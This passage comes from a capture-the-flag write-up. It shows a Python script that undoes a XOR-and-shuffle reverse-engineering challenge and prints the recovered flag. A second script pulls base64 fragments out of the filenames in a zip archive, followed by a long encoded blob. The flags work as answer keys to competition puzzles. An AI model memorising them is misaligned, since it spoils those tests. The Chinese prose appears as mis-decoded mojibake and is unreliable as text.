class="number">0x0F</span>, <span class="number">0x0B</span>, <span class="number">0x98</span>, <span class="number">0xC6</span>, <span class="number">0x65</span>, <span class="number">0x21</span>, <span class="number">0x41</span>, <span class="number">0xED</span>, </span><br><span class="line">         <span class="number">0xC4</span>, <span class="number">0x0B</span>, <span class="number">0x3A</span>, <span class="number">0x7B</span>, <span class="number">0xE5</span>, <span class="number">0x75</span>, <span class="number">0x5D</span>, <span class="number">0xA9</span>, </span><br><span class="line">         <span class="number">0x31</span>, <span class="number">0x41</span>, <span class="number">0xD7</span>, <span class="number">0x52</span>, <span class="number">0x6C</span>, <span class="number">0x0A</span>, <span class="number">0xFA</span>, <span class="number">0xFD</span>, </span><br><span class="line">         <span class="number">0xFA</span>, <span class="number">0x84</span>, <span class="number">0xDB</span>, <span class="number">0x89</span>, <span class="number">0xCD</span>, <span class="number">0x7E</span>, <span class="number">0x27</span>, <span class="number">0x85</span>, </span><br><span class="line">         <span class="number">0x13</span>, <span class="number">0x08</span>]</span><br><span class="line">rand = [<span class="number">111</span>,<span class="number">24</span>,<span class="number">236</span>,<span class="number">196</span>,<span class="number">58</span>,<span class="number">186</span>,<span class="number">93</span>,<span class="number">97</span>,<span class="number">61</span>,<span class="number">51</span>,<span class="number">169</span>,<span class="number">170</span>,<span class="number">2</span>,<span class="number">17</span>,<span class="number">113</span>,<span class="number">139</span>,<span class="number">162</span>,<span class="number">38</span>,<span class="number">14</span>,<span class="number">77</span>,<span class="number">131</span>,<span class="number">66</span>,<span class="number">112</span>,<span class="number">202</span>,<span class="number">80</span>,<span class="number">113</span>,<span class="number">231</span>,<span class="number">107</span>,<span class="number">15</span>,<span class="number">50</span>,<span class="number">159</span>,<span class="number">128</span>,<span class="number">155</span>,<span class="number">183</span>,<span class="number">227</span>,<span class="number">184</span>,<span class="number">224</span>,<span class="number">28</span>,<span class="number">16</span>,<span class="number">180</span>,<span class="number">42</span>,<span class="number">57</span>]</span><br><span class="line"></span><br><span class="line">miao =    <span class="string">&#x27;flag&#123;0123456789ABCDEFGHIGKLMNOPQRSTUVWXYZ&#125;&#x27;</span></span><br><span class="line">mia2 =    <span class="string">&#x27;f&#123;37BFGNRVZlg02468ACEGIKMOQSUWY&#125;a159DHLPTX&#x27;</span></span><br><span class="line"></span><br><span class="line">back = [<span class="number">0</span>]*<span class="number">42</span></span><br><span class="line"></span><br><span class="line">a = pxor(check,rand)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">        <span class="keyword">if</span> (miao[i]==mia2[j]):</span><br><span class="line">            back[i]=a[j]</span><br><span class="line"></span><br><span class="line">pl(back)</span><br><span class="line"><span class="comment">#flag&#123;0305f8f2-14b6-fg7b-7c7a-010299c881e1&#125;</span></span><br></pre></td></tr></table></figure><p>æ€»ç»“ï¼š</p><p>ä¸€å¼€å§‹æ²¡çœ‹å‡ºæ¥æ ‡å¿—çš„å¤§å°å†™æœ‰é—®é¢˜TATï¼Œäºæ˜¯ç›´æ¥è°ƒè¯•æ‰¾çš„mainã€‚ã€‚ã€‚</p><p>å…¶æ¬¡ï¼Œç”±äºsrandéšæœºçš„æ˜¯å½“å‰æ—¶é—´ï¼Œæ‰€ä»¥è°ƒè¯•çš„æ—¶å€™å€¼å‡ ä¹ä¸å¯èƒ½æ˜¯å½“æ—¶çš„å€¼ï¼Œæ‰€ä»¥åªæœ‰çˆ†ç ´æ‰èƒ½æ‰¾åˆ°çœŸçš„seedï¼Œå› æ­¤å°±è¦å…ˆæŠŠç¬¬ä¸€ä¸ªå˜æ¢é€šè¿‡åŠ¨è°ƒçœ‹å‡ºæ¥æ˜¯æ‰“ä¹±æ‰å¯ä»¥ï¼ˆå½“ç„¶ä¹Ÿä¸èƒ½éªŒè¯ï¼‰</p><h2 id="misc">misc</h2><h3 id="è°å·åƒäº†æˆ‘çš„å¤–å–">è°å·åƒäº†æˆ‘çš„å¤–å–</h3><p>è¿™é“é¢˜æ˜¯å‹ç¼©åŒ…<br>å…ˆæ‰“å¼€ï¼Œçœ‹åˆ°å°å‡¯.jpg</p><p>ç»§ç»­æ‰“å¼€ï¼Œå‘ç°å¤–å–ç®±.zip<br>ç»§ç»­æ‰“å¼€ï¼Œä¸€ä¸ªflagæ–‡ä»¶å¤¹å’Œä¸€å †å¤–å–ï¼Œ</p><p>ç»“æ„æ˜¯ï¼šç”¨æˆ·xxx_yyyyçš„å¤–å–ï¼Œyyyyå¾ˆæ˜æ˜¾å¯ä»¥çœ‹å‡ºæ˜¯base64ï¼Œæ ¹æ®hintï¼ˆåœ¨ä¿¡æ¯ä¸­ï¼‰ï¼šI can give you a hint: - = /<br>But there was a takeaway that was partially eaten.</p><p>å¯ä»¥çŸ¥é“è¿™é‡Œçš„-å°±æ˜¯/ï¼Œé‚£ä¹ˆå…ˆå†™ä¸€ä¸ªè„šæœ¬æŠŠæ–‡ä»¶ä¸­çš„yyyyæå–å‡ºæ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_filenames</span>(<span class="params">zip_path</span>):</span><br><span class="line">    <span class="comment"># æ‰“å¼€å‹ç¼©æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(zip_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_ref:</span><br><span class="line">        <span class="comment"># è·å–å‹ç¼©æ–‡ä»¶ä¸­çš„æ‰€æœ‰æ–‡ä»¶å</span></span><br><span class="line">        all_files = zip_ref.namelist()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># å¯¹æ–‡ä»¶åè¿›è¡Œè§£ç </span></span><br><span class="line">        all_files = [filename.encode(<span class="string">&#x27;cp437&#x27;</span>).decode(<span class="string">&#x27;gbk&#x27;</span>) <span class="keyword">for</span> filename <span class="keyword">in</span> all_files]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># æå–æ¯ä¸ªæ–‡ä»¶åä¸­çš„ç”¨æˆ·ç¼–å·å¹¶æŒ‰ç…§ç¼–å·æ’åºæ–‡ä»¶å</span></span><br><span class="line">        all_files.sort(key=<span class="keyword">lambda</span> filename: <span class="built_in">int</span>(re.search(<span class="string">r&#x27;ç”¨æˆ·(\d+)&#x27;</span>, filename).group(<span class="number">1</span>)) <span class="keyword">if</span> re.search(<span class="string">r&#x27;ç”¨æˆ·(\d+)&#x27;</span>, filename) <span class="keyword">else</span> <span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># åˆå§‹åŒ–ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ç”¨äºå­˜å‚¨å­—ç¬¦</span></span><br><span class="line">        combined = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># å¯¹æ¯ä¸ªæ–‡ä»¶åè¿›è¡Œæ“ä½œ</span></span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> all_files:</span><br><span class="line">            <span class="comment"># æå–æ–‡ä»¶åä¸­å€’æ•°ç¬¬7åˆ°å€’æ•°ç¬¬4çš„å­—ç¬¦</span></span><br><span class="line">            part = filename[-<span class="number">7</span>:-<span class="number">3</span>]</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># å°†å­—ç¬¦æ·»åŠ åˆ° combined ä¸­</span></span><br><span class="line">            combined += part</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> combined</span><br><span class="line"></span><br><span class="line">result = process_filenames(<span class="string">&#x27;å¤–å–ç®±.zip&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ï¼š</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BBQAAAAIAEVSIlgh03NsbQIAAI8DAAARACEA0KG-rbXEt9y2t7nKysIubWR1cB0AAW909RzlsI-lh6-nmoTlpYvmlpfmlYXkuosubWRFUsFu2kAQvUfKP-AJ7SdUlfoFlXqMuLQ99Fb1UPViYggBbAyJARssbUzthIBiQgjBGAz-Qnd21yf8CZ21GypZPszOe-Pem4FHA6rTQkr6z3tF39vnh9BIie4cNn3wuqB3ARuu-cOm8f7jB-DuWU0-PTk9ofENXfs0jBKl9No3Y9YUMjreL0NllKijw4Ykpn3YlMTOprGe+DteWiTjNvyegDHFfhqOkTeZWKzWgOtb7ExJZ5VpuHILyAmqwc0FxDMaKuxmedhodN0FZyTcHnjPsFzC4xZ8k82H8ilssgcPWhrrvYidJdQYO3nc5msHgpqUNLwAQsC7Y9ZWRBMc+kc5R22ZEoUFCxrqsJpD1ZUW6jPY9VinQqNGJkwjGJMi7R9tsp4PYYhwpjRRnkS1UQnhdizDsqaYT+K1UBuz+zSsYwX9YhtvNoRSyWntlBgXBfTFzVEeJjaI7QAaHtOHYHRzNonaNsGPkY2XX6DVRHc5G7u0wImQP6nWmbmVVFisK8yZ4sIwh9wmuqPrCn5yU0ufxo4UNniW+oe3TJ3Lubs4UVqZsKtxSpqB9HvcchZURKMLbhIRuAgXioYajvUcDjuVhg--NWTkRw3YzMmAD7Y5PA+f3+kQaGhQZriaC9fF-n85myNRHcNyJp8MDbcmZfeG4E7Y2pVDVVVuf0X4+YpGAVaOAnhpwsuPSIVH-ZQS08-WZ4zFbYk5tVwYYuX1PrlYkQdgTPPEWO9GBBGeOp4KeGUad-Avm1-hXH3gl7McjpDX6RGGI71bhN9H2Wjtcu+M5GR5RIXP34pffn16+-3r2c83P87eFYv4FYvZ019QSwMEFAAAAAgAJFYiWGBgdxu3ewAAdqsAAAgAEwDUv7PXLnBuZ3VwDwAB21h3qumSpeWMmS5wbmfsvAdYk2f-L45NX2jfMlptZZP6at2KiILMtKUVRxXFsmRERU1lxYBhZUlpQWXEqoiKkFpcjBAVIYwsiyEqhogQggRIJEAgIYsQEjJP0NpW7Xuuc-7n-K7-+7tOvRSfPI-39-7Oz3fk8T65a2ewzT+d-mlhYWGzdctXoRYWlhoLCwDmPUvzHWcfXoP5r3lpocFfWtR1ukyYP7wL+WLHFxYWt7Ef6Pf-w-z5-aNbotIsLOYfm-szb+gwMNPCouaDrV998W1m3KQBdXrNLIqnZn5Z8i39G+OOUaz+p-XnM6w+WHHu3ePbHtROrly1dknbgz1DLavfyfsk+s5X0Xan6z45Ely4oPa96H8eufH53kdhq2-+UPVL7JfJd1f40L9-BK9656OwfwbNv7pl3+3j7wV+x4TM-9cX32d+eutzIbI1BNc9KORQu9MO7wzJYIljVSsnJcpN9QUIaQVr5uLZ7m7vT45GD01fhxQQSark3B4ORtDNy1xidwpSYTDQJzzt9jKGpq1MWxT5plKVwLa5U4KYYVKpKjFGgDWUkSsQHaqK4IHDPDCHKnVL3BZLNfLOjalEYG9sxujaGjjhbAtzh1v8+KiCGjQ9GPhZRtQenmpmMHAtcCWcu4iR0NxRV4kAMcFqULsnHajvZXMUwbxw-7Mkl7GRieEi6KSakIdRFdGBGgDmZ812zIT7vIGLILXQOICvlqnd9T9Sn2S7WKSM+VGVfmcZ+4v1ysceGmHCXr2hiZLKP7tk65mXvzcYrJFnXn16WrhevvX3T56PaMt+-8RcDsD9sajyf3HRzWhnDWVGRbAHI8nL0coO8Co6mOHxx78mcoqsKO4YlWo430i3P5VhOstayJvi6Q8opnXgVagOjKGA3ooZr6fbGfT2p9wxoypVw2e-Lx+86myDxBknZZ-wZkxG9rAzRSY85a0XgqL9P6F4679R9KjNP-JKoBp3dKOm0cRxL+WU-C7EsXpbN03gFA9zO1Mro4TbZPOUnnTvAOPsMOaulnfDCE3EeCKvZ4qgtXoIbkWFEaNHKtpMwwXiaLuJkmG6N+5jO-BeU+gfetgP4N0wjZYW3DDVcB7tJ7hNU0ZNs0o62AjFXNMA7-9MdFNVaEPaQuxDyMSpaYz50Q2MoEOMcHyy3a7grDc1knTHeKg6Ig6ZBktdf-S9AQTG-RO7CPUnau9IQQ44OzOUNEu-T2YI6uoQ5bfXS8UjI89FjjardH0ISv7vXLRE3f4HajIeGG2qpjbtjFEvjUXwdU8j4tw747R0lWP2Ksxi5HUNkKrG2ZuouFmkYpmxDLwczcswKYerZMaJR2BwFkwlbqgHZuJJ2KHe+Mht1pGqnzn+4RFFB2w8kg5JZSMjzK8RCwpyCIikffhFyX27mqDyVdSKLwQxuqxSXqU23TLwlY6vVkbYZTT-BH0AzzsmyZE9ZKEomghKBiovDnV+CIFpyWwDm4R0tf8se7geZ0pQyAEmlEI3VO+mGsbwlBPDVSbxI9NoN516p2XoLAuJRkEnDvycUF7U61CVvnZ7uE2SH6C-8z1vJF8cEFS3OnDn3ZZYn0cByD4EKEzFwIabuC4Gy8Ti9PKP3CvaxhK9--DTotAUWise5t7SS1OrCBhyphqjTqQ79wKbm32CZISI+CGqUSM8xTNMiekEtHQVHajjgiJss0MMyxJNwpBPQlCcG2ZXawj5RDZnXhIhpuyLNZbV7cFhUqCmuqu2pfOW58RUJTgshV8g-NYmAaabSUtG-wChSLZcqFWi+nr12ZUGsJJ-43d3vJpY4jSVkjZQULdRjnpeA3anqGTURsfpX02TULMbitWmGEWvTPdsmKdxxzRqnoF1oT5DhkkCuioz+vKEmhOHj6kl3ZqKAEUhxTxj8xQldJT1HSKS5FAZJbqTelVcHFtenGoJRuxKtEuu0WVP0IeZRR3RvtujU74q7DgTv99Hnwwleq70zQ15paMjPZdyh5KxiK4GSwpPP8w5dYMqg0QDW2epmhBQrB4DUjUPE6mabAUXnEnWPIqghtsin7PB5uAdk8XFygjoO5kiQq0eF7eiQttB+DjEBMHFDXIiOOpLKzx2NnTyxXEUt1av4TvS2+cpOdDxYIhX503E6BxfwlDbVLwwbhAyM9nchB2Jyka1CWaywnln76v+BDxm30I892KQxy8BeGJ6t0mNi8WMjGnjvU39NfRoY-uyApyhxD0pj0ygGBuGMyiakqdncXr8MMbICYzyVwExv2SKuhgFN4xPzT+oOrbAGskMLZW4tmrz7jYdMT2Dd223cyYWME5S94-Gqwp-DGAtVm1CAVVRbuBBVoEq2Xdx-LMhQtQfYDZ40JIytdjX1MkqBW2HKm+XPSdQQvVd1NmHw-ZoQ8EoTd1PQN3O1PH0mYpgiu7GNlM3dWoPfQ9GIaDvkcUZZGDNw+FoU8Gcmji96v46F-yloMigwkj8vFrPuI35t7SENLV9f-xea2SV5-ilNq7It+qj5DScXUG+xww5EkS8fxHR3IX3LyD4LZwJuCHKfqbo+gONNySomuxNXL2YK9oLABdmyIzB1BjSosDUen0fM8LLbNe8YKA7RYIAr0ELiGiC5tdSsLuxT41ucVFuwxhx+FqjmmWoH7bBzCw7lYGR23fo+qMPXD7lkeh5Hu7OQ94-xGLslzq3ZoP+VZ89kP2V2DZBIS73nPTCwsmemkfDjR5TJSAqwWNGdTcrcFQyH8tuyE76A8vRVV-IGoMpiTbIrrMhhnSFjT1utdlvcMsrtFgQZbaPecM4HPIJVcYy1Q-H8kxVw2k40zYFzoQxB0AbZnqBWY3pnxnVoFpkG850cvjhKmoDhfit+IvVlvWpSxCR-gOFcFiUcLKxc1d4cawdsC6-ZdNigmeK5AEPHIvoqZFmQD5PamwmJFbcI9YFKm+pH5M2D967zT7O+APgmR02WUSfqd8R1ViDqwlMVbobe8bivcWe02geZvr2MEsvCbGPwGljFKDZTqB7hdYuYhjThjNGwmYMoFjkhDoOzOOmlMHcE4oOQlOQk6MtI5lhRdCH91b5pYcFxfB2NXr+Qkc1RLQyL0TGEVQDBA95CeSjOukNEonC0kch-4SurckPjmdEL+Y1WFHGu6naa8MTatJe2+xrY1HZvFkB3SQPMUUqYoGabxRUYx1uZTD5hjG3BKSKp3e7679VTIBnh7Vxlj1ON-JsDnmk072v3zEJ1njTUSqkP6QH9EsYK1HYWCYMBw91ZQ1xcZ9cyLRVjRPPZNv+mYM16ZcXtcUGTA1ezbWkjOdjtBmnbpjORnhVDu3BLEUmeY6j2nDan4btTKPs2xhTsDnaRrALQ0wluNVoTTcumpcdMtrX63h3ODJxMJrtSHgEI2SVtxsO4qUCOnNLr+cD1UTgjRZmWofdWdWnz-yewPutLxT5bfgDyAdx5iz+S4jpUekpqM7I+pgnh5jjug0jjx+Nyr4GckTfzWyjqhfTvZFCrLlMoGDikNpSAmys4g-gPejtpPllrrYYzo+bjVFITVrwx7ypoZDzENGP0FlpyEKZMQfnjh5fgFtFWPz7xhNjg5n8Gl0-hxqHVKwCu6OVGWD3N6sbvM0fcHWmGJfzO7ZuvbT7Dy0uObLZUfMHP46H-lSfHT73-2VRz2G+bkAYaGXx4tc3l3PsXl4dvk-77Z7nAT7gxcVxRw-5vBdXtEIHzcuH+zZbI19erVtsGfjy6sJHAODLq8cn-hfI0QJSs7Let-hmy7lsZuerW-OhS64XAywy2l4uO+iosdi39+VWn583E71O-99+MGprSekY1o9c3USNMWmnSJuiDL5i0qzViZrh4Q3FOPvSsvj86ort-u1jsyMxsR-f8GMt62EdUaPXsmoEqJ3udU4cAi5EkOg8ZZj4bgii0rTyarRZDUCQUMNbNbfL9YfmnbtT5TS1nqqrG-kRERv7San9jQlYlVt9+uYr182Zy8+loXyhfQRT3JBs2dRdMLwSltXN1mZFcPBWhCaToTLM9HOvi2o9ADyDeFrp9iyUl6tFWyEHG25TIl5Yp+CFHPwcWYjpIcYv6-muKs8O0e6bsto7TNq5o+gou2DVBbYRLm304QqfNpuy-VdZ1QZUssdWk1ScaGOLsd-ORWNpfUyy+zZFRmqSlqMJL+zlYrbXNx33ADyqmkHdmPV8R09bKFpTZfVLwrvcoeueK+HB17UzzfX9dbB27ph1Q6H0VjgmtmweHp7OXWOHLCOMkprG-TkD7zW7ToRvNsXBpXMWOL51nXwe7a6Lv9wgMz2of-iBeiUDl01zSg+P6rP9XPLRZD8ALLC+I73ZY4x8OJ1c3aF1S8zw53qnlMfFuOznJ2KKRtU3SXEo08nda48MyD6Z47T7IB9w-IhPJh8hnig7Yy9Ny8oaAh1gM5wguOS6+ttuVb1tT1VWlLHxXpJJ0tfk6Z9cwdvmn2LQewl6F1WG+Q-Nippd4-lc14UdwoZm5oRWV-Yk6-IR5As1NG03O-CF87lWlG6AFWXbxg+TO9cm2nzeIPmwx6ncN7drEQCc9nM16xuuddTgIvys-5c+e-HFeLcMRDh3xre5qxpdOPPsKHO3O0ieTImIQgn2iXS30aRyGap78OUGF2xf6NnVBlmSvbw6v2LEotepKpxaZ0VREeycNU6Lw2LQF-3ib2UNlow4eCXd3YZGISwp08nhXhCBqjBNpa6iEJgEge42ipLcPRs3FyjrXF-w3OqoeXT7iN-SWLzx+IdBTzovsB2Vj8R1hD3YIDaN44IX6Zh2SOaVqqcZ5JIOJVuQzEpvTSqO9PE4yg6KCc3oEQM16e23emkRqDXMj25tvNuwgRoxyGgWyMJExheqSXuxjZ+jxkuwxzqjyJO5dm-8ro2ByVYkUaOBKrXNHgTL+l3vaQllpk0dEot0LkQOpw4VjZk3-ygj0KueYhzV6rj6OPgOIWKuvacdc5gLT+k+fqItVPVzWFEAd97knZadhWFiRbUTPT2-cjCHsGrjV8lAYguhnRCRHmhbn1W224ryOL6xk19DaNXudSc4cZKRIeG8DpGijFcjOd1ErqUk49E7VfEb0eTU2t88Zv+cxzhi+InGpCZNVsqNZfQjhSE1HZcAfZ0ObAddY9uutJvVpha3qhZqipvYDZxY8T4xbZYZXNNDy2jQahs5VYz6hMztsZh4CD+xBspFBvrxuqduX7quJL8zh3++1sjgJ9mY5AuQOM342Az7pB3XdJyKIqEGz2Mpu-zTpr5R-Bosjgeuicu8btjkjA-5oCOGwPJ0-xg4OOB2nLvBSIugHt0IdvGqBG8p3Jo4WrAnq3Xm8zCbfarb2hkJmOOeVGVPdmUK67Mq8ovCuYwdBWJOfAzebbpawFSk-tz7gaxXSiMa4pLcW1t-E9ncP0EfZDag3Y8o474VBOCN6p71sgg21rHy6XtYU5d9xTMXWfERLtc7-25xj+5qUMniWJbBm2rHFFyb2RJBBkUAEwcipprZnGiMnUh4i7JTZbgpizcYf86x43-XDnyB-Mejmg1mPFua3H7rC0D0lqLD3OfVLvjN2XqJyqlNcBjZcflr+zOL9woyD7vUmG1o0u65N5XeaYwOkAaD+kkoQeKWQG+IfN43J18miAct5djxAdvdfvF7XEJskpg5Nz36JdaQst1r0vJ4Hm4gj7HPoGWp4zSOZi84cz9i4f4t6AO9WmM6BZJY5vnRHnCiulnSV4xGqe1osJep6XhtmR2yqJ7qW9nFz8FnXd-LQk1jv2Eg9JJgeIUZ6xVr4Of3B-NOhANDbJGSL-DIilGVSOjFh5U5AQ4hXJJweHssW7-lqXidfp5L-isuJ2gcp3u+pTZufaLniZAN-aAUV7WCG98nHQ0Q6Vp7aRz93pV47BLU2EXmPqJA-+OMshboncJF2eY2WDGm4RabLF+mxtPwyhyCGy48FLjoomtfqG8b57Bc5FxVrNdca48fAS29e4XCFMHqscSuJl57MnFxdBo-BlvRLOxvSd6s1PVvEkCpiRU73qM1vBK2zYoiYeydKX8Ox+fgfbxKQgXh3beBoCTgYgy5MfvCQFacyoKTZsnrZDknoVZ-x9vH0RjvWlIkEi4rHgHC776LrqUIw-vV6nePc-e9TNB3bM2YFL-n8If9hUeqctb4LcEfZNz6yA1zDT6onbV2IIpyoMLaX3s536JsmAq87qPyaGYOFNEIhhuMOe4VyvRPJ-03q8UZlkDawVdcBpl3-LDE9OBRmXWSShUKJPu0C6Dtd5hpDl4r80Qe8xdHonAwXbvBGwfWaUvpH4xy+l00LVorSqiyltZ+gqhEwf9MLtEMavurWdn7zBxyXPsuVX6rvuPhRp3tuswUb7S8Q8H+w3Xac8qrlA7HrYhr0n8naClaBFWRiJCJWKE1xT6cg8fKbHMfCoc0-TOe8nkuZ1+Z2RxRjg9SUzbdYkPGr+XdFIDQaR9yXe9cwuL8Wtf5-MIGxLDiOcTkIZmUxilx0HyJZDLBxCWWvnMenfcbEd9JiNx1D2pmwD-4asLpgvpJrWWzW9FHqWrjJQDY5IjkMlJsf0J0fr+aNVNDQOx45vHh8SDH3wSrskGyt8Cf+mXOoz19dW+i-J6VhbrsN+rr53Lrb3pYPZdWCv7PHhQGylFqnv5FBccvvjpUz2W8qGaWvZrlXVWYNURb-1WVwMdcWT7dSZ3eTr1rXHVk7ywk7TIS99nWM2M-mQmeX7TNleVhLrrTp8Yo1y9hvBgP1ea+94jbXDnm+EuPwsVM8MgyqDSx+j9ioWMWH3EtU8FcRn-YVtpLdetd5U5p3uQTNSgdYdILCOesTnlzMGu2tqhIzYQvBsdVmmvDz0UNhkuYJZvGccxSt3bcIrc6N1gkzOB9g3Kz1G3hMigaprpxMYXNCTVEXWtEkaZYHg+5DasIRG1ekmng7HlkCvEyD2DW6FhXJAAcA7S49EtPomW+z4jOZ5hGdFPPh367kQ2dbhgaEJFWhFPnLd3qu3NogPPz4fXyr0cfeO87WFPBmUlMKEp7lkNQoJZT3cU5BL1Ygku7g2l85vllXMZN0la03WlzCxAcP9dTXNtGPnz0QhAFt9gGqRu633H5GVF5eK+IeoZ3R2duVJVjFMuNt80JA7PlXI8+bbOQ5epRnVwhMDeKWtZq5u46rWeIcjXJ3LlttHDTkinoP2hb0GBfm92BAdQMM29NOoeyy8BkoHdJZuWarEFn8sPlWxPGmCib6qzr-UMtbeFp5rKLrHWaYR0eAI+x3h3F7Qhl+Rlczlby96r0ezjmvjvGdPEQYmYf3MQ0-VylqnpXYfjG+kR8RXOEUG1hdsCsueLv0IlQRlqxr7whsLcavadm1jJs1jJaRB0iEMpOu+haoA+2nkk5461m1-oiVisukYLF8CyIdZItUtGBMn2xi-0E44Uw5f4cNrqvUZePVaX1DdVtpHxdbhr-Lhq5hp0mQwwkXO0wRR0SNo6qV1eIC8Qg+yI1cP1swOd-9qjLH2EswWEGy4gVs0ujWme29NXJdmww63JqTpdHzxWkg+v9ADwtqHerLbTI0lT-DJH+PL0wkWjAFlQLLzbFyWjEZLW4VpYBB7uHAw6IkkjTmI-ZWXomv9TkNrj5Nw2bS67IvOVwf8hIDiHbE6rB5FBQ9Xjd9QgSMYx6Mrw4bzHp2Wdb1Z+ZPXuL6iIKYYovS70gosxkWFHCxPNWqc+gyzFee0yLnnRGZYlFORK61ksR0xI-t7sOclYbOcXyH7xSBxvbpwpgmnyOFILUmjfE3G1J0drQDL7Q7-A8+Snv7ri9g8GzeVFZtVp3njf0F5vMoF1nNvib98eIc6T0+x-2rth4NzmFlyVZy6h5bIgV45jSW30az6+IpW7hnO0gDtxcV4tYGxSbiky7quKVDqNpew2OEDh5iEHO1bt9uvXMBqy5YbtlvVuU2Wmu9bQ76rypmqdjRQRjC-DHBnT95H7D4X4Rp4aK7ssE1M4uHaB4v-vZ1jazC8+E4RQLCa3Pdte6PNMGrvRUQHIDTF2dDaZnMXbfuVN6HHXZ-cg1o5L+yphQA+ScCpfWzyuQKA4ryDV1C0pltgWjuCOh2Iaf3FZAPalWW84sYS42Q+TqoHO+FZ5Pg49d5-ETOG4aL6iLlylxdorZKCnbK-Huyh5afm5JrB9UuipaqGpyGn0qiNI1tESZxOk+R1Wkn4FTrMOGre9MCLvqTLN1CcaLV9lXALxGvfqIaV0W902femiLVAUfSuZ9UyOtnB2LUDNvTdmQ9LlbzliOMFGqsKJDJ+9N9ANLUX2YC2l4jBeHVaVN+0qVGYSmxGZ-F-2ip396f-0rjK60RbYCPdglmYAaNfPuQNn+M1fLzHQkPU4d2dUEz-HFS7DecjZk8jMcY8znuskaVpnjjnZ7rqW0tZVqTfr4F+SSf4+4pQhL3vVy7+5L0PNFprzSJYP5Zjw87BEYK9yY4XlLUtHS60S7E78-pBnjVSP00YOMVQQesiLfGlmme9a82iDEDZgTHiwVC6BkcB7K5pkTivIBzapDOdXh3jYealq9vm7O0a-mhJzZcMNMuWoMx4RNoc6-DIPICofoOIRko0NRDtTp3wP6eQaN0WeN7P7wWrHQQbNkq19WGngPE1QmGNGtfulat-wtA9sP88vmoopBW7a1-2GZ7lKC8ZnLMh7kJcDkjnrIPbwAvA2-5zkz9H6rZI1tmg3c-tIrVmNzsLcdNdf-fdrZl2WNLGTSvG3Mflz8aiZzab9ZEDcAMN5TvmPOreJfDWEOXzCzDrmbI3tYOXzv4VbYnSl+19lhxTMRAei-suJqXccvf9rs5Rdnj82qO+ukqfDP3mULS7Y7FRzSz3GWwmCNbjOieEuKruPl3p1dVhQCWlVDl+k7ZR9TDVxq7NAYES0mbqPOllGjkDP1uDVodQYmA7XjN8pBzhn81tWdGZZ5AZ1EbFoWOvRyXMxGKVQyRSJJZw8JM3dmlXUPD6+EPdvszxuAz8TaZlRm8MXFUJVjJgQbzXG9SkpGfEoy9zRFP0Cwe0o9lllSjrxA7EA5-Zb9pbYhqr7UdMdFjTZwMGTNyDJQFFJRAI4BR-82Nz1tbi9sXe4fOO1HXl73CGzn-E+1DdrDIUXm+VxU3fSoON8y8PoROS2iP2AB9DQDUmOCOmhuOrzUj4+WZl8Zx3tgD+CFGEdCzpeiJraD9-K+-I005fp6uaqiPKJl5dqdNdySyoHZ2Yr9a+rARakR9jfwXdCbvWkrginK4dQntxw4iYH2DjyVGf4EfqxTDKagCEeISBhodJm6VIrPpwzmyLYqxr9QZnMZW1AHv0s8+Ng-kKGcIVLJmgfBgWdIk+wI8JoKjHF25NCf5FeJsOOTxUjqTCI1XP8Aq9+iQFDViNFD+biH6lDFUZUzfa4CGejebhdyCsJTPtJGdK2iIyqS9XkLKlAs0Xc3St3q1iKasu+mKDSshfjWgQgZSvUxhzf7To2w3NSiq0ujpQWOexEHtTL2E+qzM1crVY8QFeQZGaOVcC9-EDtXxJk90+NpGOQJXUIE7PUZ2hj4a9oJ-em+RpOx-B5jQ2wGnzvbxCyvV-YGxSpnAJ18xNT4agwQBZHbZCGL-9VO7nkQgUUANTSrvYzE30TbPHuik4UxKh-+JIvAqCIKsOjpSrqYQI0rRsLIbZ0jzuvk9M8b3SSN0LXtkgMHxYX7isRe28krHA-xLiBHA+j1zOdHTw9+JClhG+5z+iiTlgAwi+NQAmZ1pjl9avoqZQUAd1UXq1aPD0Dzg-Lqy4oSOaaALFIOQVt-zygLM7I+VCC7WZI6MNZS-yzYbOkCqBYA1tU2S+C9anjW7stea6FbC9M4Tpq6tdUMqcEhBADsPtZHi7BLZl9o9GyRuM6zQn4FySobu-h9VQ6UL0jbMPgTlNdk-xuUFK6XG6QyY0rqiK6IpykaLomIW4GeZKBrNSdxmpPDC3CarxRVIahqklTlO0XjeD5NlsWr7-RsiQgLCDeMHZ69fpj15Hw1shIGN7ElfixEt3YHo1z4bZYmlJcW9xCzIIKYZolbMhjGTvxcMCnLJO81DJGV0QeU8BqZumMRp6r1HqY2lJoSy7VB4wjBT6SxpOl1BqfwQEYFZ3jqzkhas45TOaA0Q+VTw3iKJUW0eEOG0ZpaqYCVRtjTj8R-twpUXb+RlAw6n6bLjNUBMzL0HYOE